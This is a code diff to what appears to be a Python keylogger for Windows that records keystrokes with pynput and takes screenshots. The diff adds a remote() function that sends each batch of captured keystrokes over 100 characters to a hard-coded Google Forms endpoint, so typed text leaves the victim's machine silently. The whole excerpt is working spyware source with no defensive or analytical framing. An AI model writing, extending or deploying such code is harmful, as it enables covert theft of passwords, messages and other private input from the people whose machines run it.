@@ -8,6 +8,8 @@ import time
 import pyautogui
 import logging
 from pynput.keyboard import Key, Listener
+import urllib,urllib3
+import urllib.request
 
 #Disallowing Multiple Instance
 import win32event, win32api, winerror
@@ -32,6 +34,7 @@ count=0
 #Local Keylogger
 def local(check):
     global data
+    remote()
     if(not check):
         if len(data)>100:
             myScreenshot = pyautogui.screenshot()
@@ -51,6 +54,20 @@ def local(check):
         fp.write(data)
         fp.close()
         data=''
+    return True
+
+#Remote Google Form logs post
+def remote():
+    global data
+    if len(data)>100:
+        url="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfl08hwL-Kv0pRfhmeaJWWA5sOK8C1psyClLR4gJlLYt-SY5w/formResponse" #Specify Google Form URL here
+        klog={'entry.366340186':data} #Specify the Field Name here
+        try:
+            dataenc=urllib.parse.urlencode(klog).encode("utf-8")
+            req=urllib.request.Request(url)
+            response=urllib.request.urlopen(req, data=dataenc)
+        except Exception as e:
+            print(e)
     return True
 
 def on_press(key):
